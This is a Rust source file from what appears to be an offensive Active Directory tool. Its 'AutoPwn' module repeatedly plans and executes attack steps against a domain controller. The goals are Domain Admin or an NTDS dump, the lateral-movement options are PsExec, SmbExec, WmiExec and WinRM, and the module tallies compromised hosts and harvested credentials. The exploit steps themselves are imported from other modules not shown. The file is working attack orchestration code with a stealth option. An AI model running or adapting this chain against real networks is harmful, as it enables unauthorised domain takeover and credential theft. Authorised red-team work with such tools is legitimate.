//! Automated attack chain — wired to overthrone-pilot's Planner + Executor.

use crate::auth::Credentials;
use crate::banner;
use colored::Colorize;
use overthrone_pilot::executor::execute_step;
use overthrone_pilot::goals::{AttackGoal, EngagementState};
use overthrone_pilot::planner::Planner;
use tracing::info;

#[derive(Debug, Clone, clap::ValueEnum)]
pub enum ExecMethod {
    PsExec,
    SmbExec,
    WmiExec,
    WinRm,
    Auto,
}

impl std::fmt::Display for ExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            Self::PsExec => write!(f, "psexec"),
            Self::SmbExec => write!(f, "smbexec"),
            Self::WmiExec => write!(f, "wmiexec"),
            Self::WinRm => write!(f, "winrm"),
            Self::Auto => write!(f, "auto"),
        }
    }
}

pub struct AutoPwnConfig {
    pub dchost: String,
    pub creds: Credentials,
    pub target: String,
    pub stealth: bool,
    pub dryrun: bool,
    pub exec_method: ExecMethod,
}

pub struct AutoPwnResult {
    pub stages_completed: usize,
    pub domain_admin_achieved: bool,
    pub compromised_hosts: Vec<String>,
    pub credentials_found: Vec<String>,
    pub errors: Vec<String>,
}

pub async fn run(config: AutoPwnConfig) -> AutoPwnResult {
    banner::print_module_banner("AUTOPWN");

    let mut result = AutoPwnResult {
        stages_completed: 0,
        domain_admin_achieved: false,
        compromised_hosts: Vec::new(),
        credentials_found: Vec::new(),
        errors: Vec::new(),
    };

    println!(
        "  {} Target DC: {}",
        "▸".bright_black(),
        config.dchost.cyan()
    );
    println!(
        "  {} Creds:     {}",
        "▸".bright_black(),
        config.creds.display_summary().cyan()
    );
    println!(
        "  {} Goal:      {}",
        "▸".bright_black(),
        config.target.yellow()
    );
    println!(
        "  {} Method:    {}",
        "▸".bright_black(),
        config.exec_method.to_string().cyan()
    );
    if config.dryrun {
        banner::print_warn("DRY RUN — will plan but not exploit");
    }
    println!();

    // Build ExecContext
    let ctx = match config.creds.to_exec_context(&config.dchost, false, config.dryrun) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&format!("Failed to build execution context: {}", e));
            result.errors.push(e);
            return result;
        }
    };

    // Build initial EngagementState
    let mut state = EngagementState::default();
    state.dc_ip = Some(config.dchost.clone());

    // Determine goal
    let goal = match config.target.to_lowercase().as_str() {
        "recon" | "recon-only" => AttackGoal::ReconOnly,
        "ntds" | "dump-ntds" => AttackGoal::DumpNtds {
            target_dc: Some(config.dchost.clone()),
        },
        _ => AttackGoal::DomainAdmin {
            target_group: config.target.clone(),
        },
    };

    // Create Planner
    let planner = Planner::new(config.stealth);
    let mut failed_actions: Vec<String> = Vec::new();
    let mut total_steps_run: usize = 0;
    let max_replan_rounds = 15;

    // Adaptive Plan → Execute Loop
    for round in 0..max_replan_rounds {
        info!("AutoPwn round {}", round + 1);

        let plan = planner.plan(&goal, &state, &failed_actions);

        if plan.steps.is_empty() {
            if round == 0 {
                banner::print_warn("Planner produced no steps — nothing to do");
            } else {
                banner::print_info("All viable attack paths exhausted");
            }
            break;
        }

        if round == 0 {
            println!(
                "\n  {} {} steps planned (noise: {})\n",
                "▶".red().bold(),
                plan.steps.len(),
                plan.estimated_noise,
            );
        }

        let mut state_changed = false;

        for step in &plan.steps {
            if step.executed {
                continue;
            }

            println!(
                "  {} [{}] {}",
                "▶".red().bold(),
                step.stage.to_string().dimmed(),
                step.description.bold()
            );

            if config.dryrun {
                println!("    {} {}", "↳".dimmed(), "DRY RUN — skipped".dimmed());
                total_steps_run += 1;
                continue;
            }

            // Execute the step — pass references
            let step_result = execute_step(step, &ctx, &mut state).await;

            total_steps_run += 1;

            if step_result.success {
                banner::print_success(&step_result.output);

                if step_result.new_credentials > 0 {
                    result
                        .credentials_found
                        .push(format!("{} new creds", step_result.new_credentials));
                    state_changed = true;
                }
                if step_result.new_admin_hosts > 0 {
                    result
                        .compromised_hosts
                        .push(format!("{} new hosts", step_result.new_admin_hosts));
                    state_changed = true;
                }
            } else {
                banner::print_fail(&step_result.output);
                failed_actions.push(step.description.clone());
            }

            if state_changed {
                banner::print_info("State changed — replanning...");
                break;
            }
        }

        // Check if goal achieved — has_domain_admin is a field, not a method
        if state.has_domain_admin {
            result.domain_admin_achieved = true;
            banner::print_success("Domain Admin achieved! 🎉");
            break;
        }

        if !state_changed && !config.dryrun {
            break;
        }
    }

    // Collect final results
    result.stages_completed = total_steps_run;
    result.compromised_hosts = state.admin_hosts.iter().cloned().collect();
    result.credentials_found = state
        .credentials
        .values()
        .map(|c| format!("{}:{}", c.username, c.secret_type))
        .collect();

    // Summary
    println!(
        "\n{} {} {}\n",
        "━━━".yellow().bold(),
        "RESULTS".yellow().bold(),
        "━━━".yellow().bold(),
    );
    println!(
        "  Steps: {} | DA: {} | Hosts: {} | Creds: {}",
        total_steps_run.to_string().cyan(),
        if result.domain_admin_achieved {
            "✓".green()
        } else {
            "✗".red()
        },
        result.compromised_hosts.len().to_string().cyan(),
        result.credentials_found.len().to_string().cyan(),
    );

    if !result.errors.is_empty() {
        println!("  Errors: {}", result.errors.len().to_string().red());
    }

    result
}
